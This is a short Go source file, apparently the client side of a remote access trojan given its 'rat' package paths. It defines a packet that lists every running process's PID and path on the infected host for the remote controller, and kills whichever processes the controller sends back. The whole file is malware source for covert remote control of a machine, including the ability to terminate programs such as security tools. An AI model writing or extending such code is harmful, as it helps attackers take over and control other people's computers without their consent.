package main

import (
	"rat/client/process"
	"rat/common"
	"rat/common/processes"
)

type Process struct {
	PID  int    `send`
	Path string `send`
}

type ProcessPacket struct {
	Action    int       `receive`
	Processes []Process `send`
}

func (packet ProcessPacket) Header() common.PacketHeader {
	return common.ProcessHeader
}

func (packet ProcessPacket) Init() {
	process.QueryProcesses()

	for _, proc := range process.Processes {
		packet.Processes = append(packet.Processes, Process{proc.PID, proc.Path})
	}
}

func (packet ProcessPacket) OnReceive() error {
	t := packet.Action

	for _, proc := range packet.Processes {
		if t == processes.Kill {
			process.Kill(proc.PID)
		}
	}

	switch t {
	case processes.Query:
		Queue <- ProcessPacket{}
	default:
		// error
	}

	return nil
}
